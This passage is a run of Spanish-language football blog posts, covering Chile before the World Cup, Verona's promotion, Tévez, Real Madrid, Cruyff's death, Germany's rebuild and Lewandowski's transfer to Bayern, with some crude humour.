muchas ocasiones -de nuevo, no siempre- la desproporción de tiempo dedicada al objeto de interés y al resto del mundo hace perder el sentido de la medida sobre lo que es más importante, lo menos relevante y, cuando hay comparaciones de por medio, lo que es mejor o peor.Sólo este tipo de razonamientos me sirven para entender el hype que rodea a día de hoy a la selección chilena. Lees ciertos artículos y declaraciones, y parece que España está ya directamente eliminada, que va a enfrentarse a Brasil del 70 y al Madrid de Di Stéfano juntos, y que orgullosos nos iremos si la Roja de nuevo cuño logra mantener la dignidad ante su homónima más ancestral y parece ser que más genuina. Y no es algo de ayer por la tarde; fue salir la bola del sorteo y desbordarse una catarata de elogios que uno acababa corriendo a internet a preguntarse si se había perdido algo, si Bielsa había añadido algún título secreto a su peculiar palmarés, o si habían jugado el partido perfecto cualquier día que uno estuviese pendiente de otra cosa. Diríase que había aparecido el Balrog de los Andes.Y no, por mucha hipérbole y mucha milonga que le pongamos al asunto, Chile no es más (ni menos) que una buena selección. Es verdad que en ella juega una de los mejores centrocampistas del mundo, Arturo Vidal, aunque su estado físico se mueve últimamente entre la incógnita y Sálvame. Tienen a Valdivia, un mediapunta brillantísimo capaz de lo más increíble en los cinco minutos en los que suele aparecer en cada partido. Anda por ahí Medel, un guerrero del fútbol, e Isla, lateral profundo y fiable, bien curtido en el Calcio. Y por supuesto Alexis, un atacante honesto y trabajador, experto en dividir las opiniones del personal, que pasa por muy buen momento. Sampaoli es un preparador competente, a quien pronto veremos a este lado del charco, y en los últimos años la herencia del Loco se deja sentir en la intensidad y la presión que se han convertido en la impronta de este equipo.Pero hasta aquí. Guste o no guste, Chile no es nadie en el panorama internacional, al menos por historia y solera. Casi lo que era España hace diez años. Zamorano y Salas fueron islotes en los 90, muy lejos quedan ya Caszely y compañía y perdido en el horizonte el tercer puesto del 62. En 2010 el equipo de Bielsa llegó aún con más cartel que éste, a España le duró veinte minutos y Brasil se lo quitó de encima en octavos como quien aparta a una mosca con la mano. Hace dos días no lo pasaron nada bien para deshacerse de Australia, a muchos de sus futbolistas no le sobra experiencia al más alto nivel y la exigencia física del sistema de juego es tan grande que es muy frecuente ver boquear al equipo a partir de la hora de partido. Es otro buen equipo, sin más, que si se dan las cosas bien con cruces favorables puede firmar unos cuartos, pero que va hacer rico a más de uno si toca semifinales.Así que tranquilidad. Para España no será fácil ganarles, pero tampoco es que los chavales de Del Bosque vayan al matadero. En condiciones normales, el favorito es el campeón del mundo. Y si éste gana, la última jornada tendrá miga. Mucha miga.Por cierto y al hilo de la inesperada polémica acerca de la paternidad de la Roja que viene revoloteando sobre el España-Chile desde que salió la bolita en el sorteo, puedes repasar la historia de nuestra camiseta en este artículo de Cupones Mágicos. PINCHA AQUÍ para seguir leyendo.Centrifugaron pantalones y de aquella camiseta violada nunca más se supo.En Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo, no podrás encontrar la elástica violada pero sí un catalógo completísimo de equipaciones de la Fiorentina.Foto: escaneada de ‘Atlante illustrato del calcio 80’ (isbn Edizioni) Me entero en el blog de Giancarlo Rinaldi, un medio italiano medio escocés enamorado de la Fiorentina al que sigo por su habilidad escribiendo sobre las cuestiones transalpinas, de que el Verona ha subido a la B. Llegaron quintos a la fase de ascenso y por eso los tenía descartados pero la gialloblu ha sabido agarrar el tren en marcha y aun con la lengua fuera y en el último vagón eliminar a un par de equipos mejor clasificados para plantarse en segunda. Así pues, cuatro temporadas después y con el aliño épico del que acostumbra consumir la parroquia histórica del Bentegodi, vuelve un clásico vuelve el Verona.Al Verona hay que quererlo por lo que hizo en el 85. Si no han tenido oportunidad de repasar el único scudetto que se han embolsado en toda su historia  háganlo ya, es altamente recomendable. Les paso hasta la invitación al bar donde lo sirven calentito. El más provinciano de todos los invitados a la jarana, ojo que por allí alternaban Platini, Maradona, Bruno Conti, Socrates y Zico, se llevó a la audiencia de calle. Y fue una historia de rebeldes y personajes la del título scaligeri. La de un pragmático hasta lo insano Bagnoli en el banco, la de las galopadas a pie cambiado de Turbo Fanna, las contras con el humo del último cigarrillo en los pulmones de Elkjaer Larsen, la magia anómala de Claudio Garella bajo los tres palos y el abuso físico de Briegel. La de las camisetas preciosas. Indaguen que merece la pena.Pero aunque la contra de aquel Verona Bagnoli era oro no le alcanzó para replicar el modelo en el futuro y el club ha jugado al yo-yo desde entonces. Arriba y abajo hasta el último descenso en 2001, quizá el más amargo por tratarse también de la primera temporada en la élite del vecino pobre, del Chievo. No sirvió de nada la mano de Malesani ni el talento exultante de Mutu, ni el concurso de futuros campeones del mundo como Camoranesi, Oddo o Gilradino, el Verona se despeñó en la última jornada mientras el Chievo se marcaba un alucinante sexto puesto. Duro, tanto que desde entonces no levantaron cabeza hasta el punto de hundirla en la C por primera vez en 60 años. Eso fue en 2007 y ahora, con el periodo más negro de su historia alejándose por el retrovisor y proyectos realmente excitantes sobre el tapete como el nuevo estadio, el Verona parece estar en condiciones de volver al lugar que le corresponde. Volver. En esas está, como en el inmortal tango, Carlos Tévez, frente marchita con tan sólo 26 años. Que el Apache vivía a disgusto en Manchester por lo cicatero de la propuesta de Mancini, por la añoranza o vaya usted a saber por qué, era vox populi desde comienzo de temporada pero ahora ha decidido plasmar su descontento de modo formal y ha remitido a sus jefes un transfer request, la carta oficial en la solicita ser traspasado. Una bomba. Parece ser que Tévez extraña tan desesperadamente a sus dos hijas, ellas viven ahora en Buenos Aires, que se ha planteado volver al fútbol sudamericano o incluso retirarse definitivamente del circo. Liarse la manta a la cabeza, vaya. Por otra parte está su noviazgo con Roberto Mancini, que comenzó mal y tiene pinta de acabar aun peor. Sea como fuere Tévez está dando vueltitas ahora mismo como en el tango, adivinando el parpadeo de las luces que a lo lejos marcan su retorno. El City ha rechazado la petición del astro aunque él, cabeza caliente donde las haya, parece convencido de emprender el camino.Algunos en Inglaterra están tratando de explicar la espantada del argentino desde lo futbolístico. Argumentan que Mancini y Tévez partieron peras hace tiempo y que la bronca del delantero el pasado fin de semana en Bolton tras ser sustituido por enésima vez ha sido la gota que ha colmado el vaso. Yo simplemente no puedo aceptar la explicación. Si hay un futbolista valorado en el City ese es Tévez. Capitán con Mancini desde el principio, tiene una misión clara en el Manchester City, ser el aceite esencial que haga girar el motor ya no del equipo sino del club. El Apache es la carta más valiosa y así se lo ha transmitido el club. El centro del universo citizen en el rectángulo de juego y el actor principal en la política de comunicación de la institución. Su mayor reclamo. Allí se ha hecho un hueco en Europa y más allá de desavenencias personales con el técnico creo que son razones más íntimas las que le impulsan a dejarlo todo. ¿Ahora que el proyecto funciona se va? Suena extraño pero posiblemente Tévez se haya hartado del fútbol.Abundaremos otro día en la caprichosa psique del argentino, no es la primera vez que amenaza con cortarse la coleta, pero lo cierto es que el Manchester City tiene ahora un problema serio. Justo en pleno asalto al liderato, cuando el equipo comenzaba a agarrar la consistencia de la que ha carecido en los últimos años, pueden perder al hombre que garantiza el gol (39 en los últimos 60). ¿Quién liderará el proyecto? No será sin duda esa legión de escuderos con mayor o menos talento que minan la alineación celeste, tampoco un Adam Johnson tan talentoso como inconstante. ¿Adebayor? Tiene pie y medio fuera y no hablemos ya de Mario Balotelli, la estupidez personificada.Si acaso el City puede aferrarse al petrodolar. Pocos equipos van a poder pagar los 30 millones de libras en lo que han tasado al futbolista y de los que el club no va a perdonar ni un penique. Pero hasta entonces si yo fuera el dueño del club y teniendo en cuenta que 250.000 a la semana no han sido suficientes para retener a Tévez (al astro parecen gobernarlo intereses más viscerales) iría desempolvando la mejor de mis sonrisas y el manual de diplomacia. De ello depende el futuro inmediato del club. A modo de previa del Almeria-Real Madrid, os dejamos dos reflexiones definitivas de Juanma Lillo sobre el evidente, y lamentable, proceso de polarización que está sufriendo La Liga en las últimas temporadas. “Yo creo que el Madrid no tiene rivales en la Liga, aparte del Barcelona. La gente ni se atreve a rematarle. Las estadísticas de los dos primeros de la Liga significan que, desde hace dos años, en el fútbol español ha empezado un mundo nuevo. Las diferencias son insalvables”. “¿Cómo vas a retener a Villa o Silva si los quieren fichar unos equipos que le sacan 20 puntos al Valencia, que es el tercero?” Y yo añado, ¿Acaremos, salvado las distancias que marca la calidad, siendo un remedo de la Liga Escocesa? Cristiano Ronaldo cree que Zinedine Zidane es muy simpático. Isco ha dejado de escuchar el lenguaje de los delfines para experimentar junto al nuevo entrenador un orgasmo comunicativo desconocido. Es la rara magia de Zidane y no la escasa resistencia del Deportivo y, principalmente, del Sporting la que ha transformado las estadísticas de la BBC en un diamante hasta la ceguera. Zidane consigue que Bale defienda y corra con inteligencia y parezca, de repente, un Sim nuevo por el que merece la pena no borrar la partida y destrozar el teclado contra la pared.Está la amenaza de que entonces los futbolistas no querrán venir a España y la Liga se pauperizará, pero poco nos debería importar eso cuando del futuro de todos se trata, de nuestras pensiones, nuestros hospitales y nuestros colegios. Dejad de reíros, hablo en serio.Sociedades opacas y poca vergüenza. Nada que nos sorprenda. Desde el escritorio veo la impunidad desnudarse sensualmente frente a mí. Los papeles de Panamá acabarán mojados. Falta voluntad política y, sobre todo, fuerza social, confianza en lo colectivo. Esas cosas que la izquierda hacía antes. Antes cuando el mundo no era una criatura insensible sin más pretensión que engordar. Se venía anunciando la goleada. Los problemas de puntería parecían algo temporal, una tierra baldía momentánea que escondía un vigoroso géiser de goles. Se especulaba con el equipo que pagaría la falta de acierto inicial, con ese combinado al que le endosarían todas las facturas sin cobrar. Ayer, en el Bernabéu, se ensañaron con el más débil, con un Deportivo de La Coruña incapaz de imponerse futbolísticamente a nadie en lo que llevamos de torneo. El colista de la liga visitó el templo merengue con la íntima convicción de que no sería su día. Un gol en el minuto cuatro fue concluyente, no había nada que rascar contra el equipo de Mourinho. La alineación del portugués, la que quiere que memoricemos los aficionados, dejaba atrás el inquietante trivote y la obtusa presencia de Benzema. El resultado afianza el once jugador por jugador.Últimamente, las buenas noticias del Madrid las suelen traer dos futbolistas: Özil y Di María. Del primero destaca su talento puro, su desborde y esa cualidad que consiste en hacer fácil lo difícil. Como comentaba mi compañero Borja Barba hace un par de semanas, el alemán domina una serie de recursos técnicos con extrema facilidad. Está tranquilo, no se aturulla ni se espanta ante la presión del rival, sólo juega con una sencillez que es un trampantojo. Nos ofrece facilidades cuando está dándonos una lección de complejidad futbolística. El gol que marcó, complicándose la vida, regateando en el área ante la nutrida defensa del Depor, puede cimentar mi argumento.Di María, una incógnita a principio de temporada, hace esas cosas que el año pasado tan bien hizo Cristiano Ronaldo. Arrancar desde la banda, irse en velocidad, obligar al contrario a emborronar el dibujo defensivo, asociarse con los delanteros y marcar si la ocasión se lo permite. Un incordio, constante y efectivo, capaz de subir el balón con criterio o rematar un centro con la precisión de un asesino del área. De los mayores hallazgos de la temporada. Su papel estelar en el Benfica era un buen síntoma pero no una certeza palmaria. Tiene buena parte de culpa de la fluidez ofensiva del Madrid, siempre aportando soluciones cuando el equipo se encalla en el campo del contrario.Esos son los nuevos, de los de siempre ayer brillaron sobre todo Higuaín y Xabi Alonso. El centrocampista tolosarra ha asumido que tiene más obligaciones de ataque que en su labor en la selección o en su brillante periplo inglés. Ahora es un centrocampista de vanguardia que debe legar el rigor defensivo en Khedira o Lass y mirar hacia arriba. Por delante tiene a Cristiano, Özil y Di María, tres jugadores que se alimentan de los balones que escupe el centro del campo, que se mueven entre líneas o se incrustan entre los centrales para hacer sus diabluras en la tangencial del área. El Madrid necesita un timonel que elija el rumbo del juego, priorice el costado donde arrancar la jugada, temple el fútbol  cuando el marcador es favorable y acelere cuando haya necesidad de anotar. Mourinho necesita ese tipo de jugador, un punto intermedio entre Lampard y Sneijder, con muchas similitudes con el Deco de Oporto. Con la claridad y la briega del inglés, la potencia y verticalidad del holandés y la soberanía del portugués. Poco a poco y en parte gracias a la eficiencia de Khedira, el futbolista vasco está haciendo sonar al Madrid al ritmo de su batuta.Higuaín, un delantero intermitente con tendencia a desaparecer en las grandes ocasiones, fue ayer el mejor de su equipo. Peleó todos los balones y no se regodeó con las ovaciones instantáneas que el Bernabéu siempre brinda a los que porfían por la bola, sino que jugó con criterio cada uno de esos balones controlados. Se tiró a los lados, centró, buscó el apoyo de los extremos, facilitó la labor del mediapunta y anotó un nuevo gol. Los registros anotadores del argentino tienden a callar a los que, como yo, pensamos que el Pipita no es delantero letal que el Madrid necesita. Pero visto Benzema, bendita sea la irregularidad del argentino y ojalá que dure su racha goleadora, lejos queda aquel jugador timorato al que la portería se le encogía en las narices y que tuvo que entrenar, según la prensa afín, el tiro a puerta después de cada entrenamiento colectivo.No fue un partido difícil. Hay que ganarlo todo pero el Deportivo de La Coruña no es ni la sombra de aquel equipo de ensueño que se ganó el cariño de media España. Ahora deambula por la primera división sin un plan de futuro, con el único objetivo de mantenerse y esperar tiempos mejores.Zidane es el hombre que gritaba desde la banda las claves exactas que a Ancelotti se le escaparon para ganar la décima. ZZ Top cierra Valdebebas y no se descarta que en algún descanso de sus maratonianas jornadas descubra la vacuna para un par de enfermedades raras.Es palpable que el Real Madrid juega bastante mejor desde que Florentino Pérez ordenó el enésimo cambio de cromos. Algo indiscutible. La defensa logra irse al vestuario sin el culo manchado de la cal que marca los límites del área y las retinas de los delanteros son rodillos de recreativa enfurecidos con desmarques, líneas de pase inteligentes y esfuerzo generoso como únicas combinaciones posibles. Todo es alegría, todo es lo nunca visto y hasta las coberturas parecen trabajos vocacionales. El Madrid se ha enchufado, pero tiene un problema, jamás será capaz de jugar a la altura de lo que imagina la propaganda.El Madrid fue un vendaval de fútbol ayer. Las sensaciones son un pelotón de flechitas hacia arriba en la libreta de cualquier espectador. Pero claro, todo llega contra Deportivo y el Sporting, un equipo, el asturiano, que despistó el coraje que les ha llevado a Primera en cuanto tiraron la primera selfi en el paseo por el Bernabéu.Quiero conocer el verdadero valor de Zidane y su Madrid contra equipos que muerdan la salida de balón de Kroos, contra tíos que vivan pegados a su marcador, contra rivales capaces de colocar al Bernabéu en posición de empujar durante los noventa minutos. Quiero ver al Madrid cuando la convivencia convierta el efecto cama en un concepto incómodo. Cuando las milongas sobre formas físicas y ajustes tácticos finísimos, más antiguas que el fútbol, se acomoden en ese rinconcito de la hemeroteca que les pertenece. Quiero verles en el alambre de la eliminatoria europea contra la Roma, un equipo que comparte con el Madrid la eterna competencia contra su propia historia y la sensación de que el aire es más puro, alpino, desde que se fumigaron al último entrenador. Mientras tanto, los fuegos artificiales en el patio de tu casa nunca serán lo mismo que en la plaza mayor. Con el cerebro flotando aun en el líquido que podría ser la destilación  perfecta de la satisfacción, gracias a la gesta definitiva de los veintitrés de rojo,  he tenido un momento para revisar los siempre interesantes datos que Opta,  la consultora especializada en estadística futbolística, nos viene  brindando durante toda esta Copa del Mundo. Este equipo de auténticas  calculadoras humanas acaban de publicar la traducción numérica de la involución. El número de tiros a puerta y el porcentaje de ellos por partido, en cada uno de los mundiales desde el que acogiera Inglaterra en 1966. Números cantan y asustan. Y sí, Diego Armando Maradona  tenía razón cuando nos espetó aquello de que al fútbol se juega, cada vez más, con los arcos en los  laterales. Cotejar la tabla adjunta y coindicir con el ídolo argento,  por más que la declaración rezumara ventajismo a borbotones y mal perder a partes iguales, es todo uno. VeanDurante la Copa del Mundo de Sudáfrica se anotaron poco más de dos goles de media por partido (2.27)  y ha sido, como todo indicaba que iba a suceder desde que la pelota  echó a rodar, un campeonato de una racanería goledora remarcable. Tan  sólo se marcaron menos en aquel paradigma del fútbol samba que fue Italia 90 (2.21 por partido). Por cierto, allí  también cayó Maradona con todo el equipo aunque seguro que el ideólogo  de los arcos en los laterales prefiere olvidar lo roñosa que era aquella  albiceleste. La estadística abre los ojos a cualquiera y viene a corroborar  la tesis de los que sostenemos que la táctica (el dichoso 4-2-3-1 por ejemplo) está matando poco a poco el  espectáculo, que desde hace demasiado tiempo se juega a no perder,  sin  importar la estética. Si a ésto le añadimos el ingobernable instrumento de trabajo que  Adidas nos ha mandado como condena, uno empieza a comprender los  números. Diferencia Juanma Lillo en Culturas del Fútbol (buen libro en el que participan varios editores de esta casa), entre ser entrenador y estar de entrenador. Dice el mister del Almería que una persona es entrenador cuando posee la capacidad suficiente para entender el juego y la destreza para dirigir un equipo de fútbol en base a su preparación. También señala que, cada vez más, los técnicos dadican más tiempo a agigantar continuamente su personaje enfrente de un micrófono que a entrenar. A exponerse al público para mantener su estatus que a exigirse en beneficio del equipo. A estar en lugar de a ser. He pensado en ello en muchas ocasiones. Cuando Pep Guardiola o José Mourinho (y cito sólo a los que han practicado la argucia últimamente) exigen a los medios la presión necesaria para que el colectivo arbitral “reflexione” o mismamente hoy cuando me he enterado de que el special one ofrecerá su sexta rueda de prensa en séis días.No dudo de la capacidad profesional de Guardiola y Mourinho. Ambos pueden plantarme en la cara una hoja de servicios intachable que les avala. Ahora bien, pienso que ejemplifican al profesional aquejado de una profunda “entrenadoritis” . En demasiadas ocasiones parecen estar más que ser. Imagino que la eterna cantinela “es algo que va con el puesto” condiciona la actuación de estos señores. También que la maquinaria mediática engulle cualquier atisbo de singularidad y cordura pero cuando veo a periodistas alabar el manejo de las ruedas de prensa de estos técnicos-actores, glosar su buen hacer sobre las tablas,  aplaudir la facilidad para el titular de determinados profesionales, cuando veo páginas y páginas perfilándonos hasta el último detalle de la personalidad de estos nuevos líderes se me revuelve tanto el estómago que por un momento pierdo todo interés en el fútbol. ¿Realmente tanta cháchara inane? ¿No deberían dedicarse un poquito más a ser que a estar? Cuando el Oviedo jugó por última vez en Segunda División no había Vine. De hecho, el servicio de vídeos cortos nació en 2012, con el club en el alambre, pero a lo que vamos. Agotados tan solo dos partidos de este nuevo ciclo en plata, no dejo de pensar en el vídeo que definiría el regreso. ¿Osos panda felices? No, yo veo una mujer bastante mona, no despampanante pero al fin y al cabo la más guapa que puedes imaginar tras una década emboscado en el monte. La tía saluda a un tipo con un cándido “holi” y a continuación le calza dos bofetones como dos soles. Le cruza la cara sin mediar más palabra. Lugo y Alavés, un hostión en cada mejilla de la Liga Adelante y un hombre vestido azul recibiendo. Todo en un bucle de seis educativos segundos.El Oviedo dejó Vitoria el negativo de la imagen ofrecida hace una semana en el Tartiere. Es lo normal en un equipo que se está cociendo. El hilo conductor fue el desbarajuste defensivo pero en cada vaso comunicante hubo ingredientes muy diversos. En Álava faltaron la claridad para cimentar la jugada y la inteligencia para generar peligro. También intensidad, concentración y la fuerza para sobreponerse a los golpes. Ilusionó, eso sí, el estreno de Aguirre, muy fino trabajando la banda zurda.Cuando terminó el partido en Mendizorroza, 2-0 incontestable ante un Alavés que ya la temporada pasada demostró buenas hechuras, recordé inmediatamente las palabras recientes de Joaquín del Olmo, el asesor mexicano del Real Oviedo. “Para mí esta plantilla es la mejor de la categoría” El oviedismo tiene motivos nítidos para agradecer la enorme ambición de Carso y Del Olmo pero el discurso, inoportuno y que a duras penas casa con el #humildadycorazón enarbolado por el club en cada tuit, no pudo ser heraldo de una realidad más distante. Tanto que convendría imprimir la declaración y colgarla en el vestuario del Tartiere para que los futbolistas la desobedezcan a partir de ahora. Podemos ser, de momento no somos.Del Olmo tiene razón, hay una gran plantilla al lado de sus palabras en el Tartiere, pero por si queda algún despistado, enmarcaría junto a la suya una frase de Pulp Fiction que se hizo clásica en la boca de Harvey Keytel, del Señor Lobo. Imagino lo de “no empecemos a chuparnos las pollas todavía”, impreso en espartano blanco y negro sobre la pared como buen punto de partida para empezar a solucionar problemas.A Lotina se le agotó el crédito hace tiempo y ya no sabe sacar más jugo de una plantilla discreta y barata. Fue un serio repaso el de anoche en el Santiago Bernabéu, y sirvió para sacar dos conclusiones: el Madrid tiene argumentos para ilusionarse esta temporada, el Depor necesita un cambio urgente para eludir el agujero que prematuramente se ha abierto a sus pies. Vivimos en un mundo enorme, a la fuerza lleno de imbéciles. Es una cuestión de estadística. El único temor que tengo en esta vida es ser uno de ellos. Haberme transformado entre espasmos en un idiota, como un hombre lobo de serie B. Un morphing que convierte a un escritor chispeante en un tremendo gilipollas. A veces pasa. El periodismo que practico como un intruso entusiasta da para eso. Para evitar ser un imbécil leo mucho a los imbéciles y trato de llevarles la contraria. Quizá eso me convierta en uno de ellos. Siempre hablamos del otro cuando el otro somos nosotros mismos. Es historia de la literatura.El aplauso es uno atajo hacia la imbecilidad. Confiar en el gusto de los demás es tan arriesgado como darle la mano a un desconocido. No caló el mensaje de mamá cuando decía: no hables con extraños. Si no puedes hablar con ellos, imagínate celebrar sus piropos y cumplidos. A veces la gente ni lee. No albergo otra explicación para ver celebrados artículos tras la muerte de Cruyff, por ejemplo. Me encantaría enlazarlos, pero no tengo cojones para tanto. Cuando alguien famoso muere se disparan las tonterías. Que un escritor pintarrajee una historia sobre el futbolista holandés aludiendo a sentimientos de íntimo dolor me parece obsceno. Pero el mundo es un lugar enorme, y a la fuerza –insisto- debe cobijar a gente así. A gente como yo, dirán otros. Y lo asumo.Iba a escribir sobre Cruyff aunque no lo parezca. A mí Cruyff  me hizo llorar de niño. La culpa la tenía ese Barcelona que arruinaba los dulces sueños de los niños madridistas. Yo no sabía que ese tipo de nariz ganchuda y mofletes severos había sido jugador. Para mí era el jefe malo de los G.I. Joes. El Comandante Cobra que colocaba a sus hombres para arruinarnos la vida a los del Buitre y Michel. El gol de Koeman rompió la inocencia. La Copa de Europa estaba ahí, sólo había que cogerla. Y lo hicieron los de azul y grana antes que los de blanco. La felicidad es una reflexión acerca de la tristeza. Ese era Cruyff para mí, el esquelético capitán de un barco fantasma, un monstruo bajo la cama, el Capturador de Niños del Chitty Chitty Bang Bang.El tiempo, y un VHS de la Historia de los Mundiales que mi tío Sebastián guardaba como un tesoro en su casa, me hicieron entender quién era ese tipo que había revolucionado el fútbol. Verlo perder con esa malla naranja era tristísimo. Imaginabas tras esa historia del 74 una negación de la belleza, la pugna atávica entre luz y sombra. Entre Berti Vogts y Johan Cruyff había un abismo que todos estábamos dispuesto a cruzar. Un puente colgante entre el pragmatismo y la estética, entre el despeje y el regate, entre el marcaje y el gol. Era imposible no entender la punzada de Cruyff, el 14 tatuado en la espalda. Todos estuvimos ahí en algún momento de nuestras vidas, en esa derrota, sobre el machacado césped del Olímpico de Múnich, más olímpico que nunca.La muerte siempre nos pilla despistados, es parte de su encanto. Escribir sobre los muertos es un ejercicio terrible. ¿Por qué hablo de imbéciles antes de hablar de Cruyff? Porque quizá ya soy uno de ellos. Como los que se hacían selfies en el sepelio. Esto viene a ser algo parecido: retratarnos a nosotros mismos glosando la vida sesgada de los demás.Entiendo que Cruyff es parte de un itinerario íntimo. Que estuvo ahí desde siempre viéndonos crecer. Que Guardiola y todo lo que vino tiene su tiesto en las gabardinas del holandés, en su concepción del fútbol. Los grandes jugadores son como la lejía: despintan los colores.En mi barrio, Miralbaida, había sólo una tienda de deportes: Deportes Varo. Allí me compré mis primeros guantes de portero. Siempre iba con mi tío Sebastián, que conocía al dueño de las pachanguitas de los domingos. Paco Varo era un tipo alto y serio pero cuando entraba con mi tío de la mano siempre sonreía. Detrás del mostrador tenía una foto enmarcada, bien grande. “¿Sabes quién es?” , me dijo, cuando me pilló mirando la fotografía. “Claro — dije— , es Cruyff”. “¿Y el de al lado sabes quién es?” escudriñé la imagen: las calzonas cortas, el azulgrana. “Ni idea”, contesté. “Es Paco Varo, hombre” dijo mi tío. “Somos Cruyff y yo en el Levante, en la 80/81. Jugamos juntos. El mejor futbolista que yo he visto”. Que Paco Varo, el señor adusto al que le compraba las medias de Luanvi y los tacos nuevos para el albero, hubiera jugado con Cruyff me dejó helado.Ese Levante acabó en mitad de tabla. A Varo le sacaron tres amarillas. Cruyff marcó dos goles. El Castellón quedó primero en Segunda. El Córdoba estaba en 2ºB. Yo chupaba banquillo en el Miralbaida. No pensé que algún día escribiría sobre esto. No pensé que algún día sería escritor. Siempre temí ser un imbécil. Hace tres días murió Cruyff. El fútbol es de los futbolistas. El cáncer es un enemigo terrible. Nada que no sepáis. Nunca aprende uno a perder. Como no se aprende a encoger el brazo si te pinchas un dedo. La patada que Maxi Pereira le dio ayer a Campbell es el resumen de lo que hemos aprendido todos estos años en cuanto a digerir una derrota. Ahí estaba su examen final en el FPO de llevar los fracasos con dignidad.Contra la mayoría de los pronósticos, el equipo de Oliver Khan (mejor jugador de aquel Mundial), Michael Ballack, Miroslav Klose, Bernd Schneider o Torsten Frings, con un plantel de perfil relativamente bajo, consiguió colarse en la final de Yokohama tras deshacerse por el camino de Paraguay, Estados Unidos y Corea del Sur, haciendo valer la eficacia de la simpleza del uno a cero durante todo el torneo. La final fue otro cantar. Brasil, con aquel Ronaldo estelar batiendo en duelo al sol al gigantesco Khan, se deshizo con relativa comodidad (0-2) del seleccionado de Rudi Völler. El proceso de transformación estaba servido.La gran cita para Alemania llegaba con el Mundial organizado en casa. Debió de ser duro asumir que tal vez llegaba algo pronto, con el proceso de cambio bien iniciado pero aún en una fase intermedia y que cualquier resultado que implicase jugar la última semana del torneo tenía que ser considerado un éxito. La selección en la que ya empezaban a brillar Philipp Lahm, Bastian Schweinsteiger, Per Mertesacker o Lukas Podolski daba ya síntomas de inequívoco entusiasmo de la mano del técnico Jürgen Klinsmann, aquel al que muchos consideran como el gran artífice del giro argumental del guión germano.La Eurocopa de 2008 había dejado de manifiesto que Alemania ya era otra, un equpo capaz de pelear por los títulos. Con la salida del equipo de viejos pesos pesados como Lehmann, Frings, Ballack, Metzelder o Kurányi y la incorporación definitiva de Özil, Müller, Kroos, Khedira o Neuer el cambio generacional estaba servido. Los alemanes llegan a una cita mundialista con la sensación, por fin, de que el asalto al entorchado mundial es plausible. Solo la mejor España de la historia y el vuelo de Puyol sobre la empalizada germánica consigue frenar el avance teutón en la recordadísima semifinal de Durban (1-0). Pese a todo, la maquinaria ya estaba en marcha con Maracaná en el punto de mira y Belo Horizonte como estación para la sublimación de una propuesta. Veinticuatro años después de la final de Roma, Alemania volvería a dominar el planeta futbolístico gracias a una generación insuperable. Neymar. Inconmensurable en el paseo militar ante el Athletic Club. Otro gol más y la sensación de que no hay futbolista en el mundo que domine la técnica del regate como él. Parece haber asumido, por delegación de Messi, ciertas tareas que venían correspondiendo al argentino. Adorna todas sus acciones como si los partidos se ganasen a los puntos, pero es que todo lo que hace parece hacerlo con sentido.Kevin Gameiro. Segunda semana consecutiva en la que debemos destacar al atacante francés del Sevilla. Está en racha y todas sus intervenciones acaban generando peligro sobre la meta del rival. Otras dos dianas ante el Málaga, exhibición de movilidad y velocidad en los metros decisivos, le colocan ya con once en lo que llevamos de Liga.Álvaro Negredo. De un balón perdido, de un despeje a la desesperada de la defensa valencianista, sacó un golazo inolvidable. Puede que necesite mucho más aún para terminar de reivindicarse y justificar su incorporación al Valencia, pero la simple idea de decidirse a probar suerte desde cuarenta metros dice mucho de la voracidad del delantero vallecano.Pedro León. Ha dado un salto en su nivel habitual y el Getafe lo ha notado. Frente al Espanyol, un golazo, un zurriagazo a la madera y una clase magistral de lo que debe ser dirigir a un equipo de recursos escasos como el azulón. Sabe lo que le pide Escribá y los días que se sacude su eterna frialdad de encima es un capricho de futbolista.Fabián Orellana. Salta el nombre del chileno, futbolista de elevada intensidad, como podían haber saltado el de Guidetti, el de Aspas o incluso el de Wass. Empeñados todos ellos en demostrar que sin Nolito también habría alegría en Balaídos. La filarmónica ofensiva de la viguesa tapa la falta de tensión y los habituales errores de la zaga (dos, graves, ante el Levante, para colocar al Celta con treinta goles encajados). El fútbol actual ya no tiene hueco en su primer nivel para Andoni Iraola (Usurbil, Gipuzkoa, 1982).Rutinaria. Así se puede definir la victoria del Madrid de hoy ante el Levante, la misma que consuma el extraordinario récord de Mourinho de nueve años seguidos sin conocer la derrota como local en liga. El portugués realizó de entrada el gambito más arriesgado –prescindir de Xabi Alonso– pero Luis García Plaza, quizá influido por el tenebroso recuerdo de la Copa, dispuso un autobús digno de Maguregui y renunció a una presión un poco más adelantada que hoy en particular hubiera podido darle resultado. El partido lo rompió Di María con un triple regate desde parado que culminó Benzema y le puso el sello, poco antes del descanso, una falta de Cristiano que remachó Carvalho bajo los palos. Poco más que reseñar en un segundo tiempo donde ninguno de los dos equipos pareció tener mayor interés en cambiar el resultado: por decir algo, algunas cabalgadas de Juanfran por la banda izquierda, la constatación de que Kaká no está para grandes cosas, la exhibición de reflejos de Munúa y un slalom de Özil, que levitó entre futbolistas del Levante durante unos treinta metros, y acabó dejando un agradable regusto final en el Bernabéu. Por demás, un triunfo muy útil para el  Madrid que tampoco dejará tocado al Levante, una escuadra por demás admirable que no ofrece, en ningún sentido, el aspecto de los equipos hundidos. Por ahí se cuenta de vez en cuando un chiste muy viejo que suele triunfar. Llega un individuo a un burdel y le pregunta a la madame por quién tiene disponible. La madame le pregunta: “¿le gustan las chicas rubias o morenas?” “Morenas” “Pase ahí por la puerta de la derecha”. El hombre pasa, y hay otra que le pregunta: “¿Chicas altas o bajas?” “Más bien bajitas.” “Vaya por aquel pasillo”. “¿Vestido largo o pantalones ajustados?” . Y así cinco o seis veces. Al final , cruza la última puerta y se queda de piedra cuando se da cuenta de que ha salido otra vez a la calle. Indignado, se da la vuelta y se encuentra otra vez a la encargada, que le dice: “Mire, le voy a ser sincero. Putas, lo que se dice putas, no tenemos, pero… ¿a que nos organizamos de maravilla?” Esta es la historia que se ha venido a la cabeza de servidor cuando se ha confirmado casi con total seguridad el traspaso de Lewandowski al Bayern. Todos, en diferentes contextos, hemos alabado una u otra vez a la Bundesliga como un campeonato modélico: entradas baratas, dinero para todos, trato correcto al aficionado, estadios siempre llenos, un producto perfectamente envuelto para uso y disfrute del público. El duelo Borussia-Bayern ha enardecido a los aficionados de toda Europa durante dos años maravillosos, y atrajo  las miradas de todo el mundo a un campeonato que llevaba demasiado tiempo a la sombra de la Premier y la Liga. Sin embargo, en apenas seis meses, los fichajes de Götze y Lewandowski han cambiado completamente el panorama, y es de esperar que en los próximos tiempos el interés en el campeonato alemán descienda exponencialmente y vuelva a convertirlo, como ya ocurrió en otras 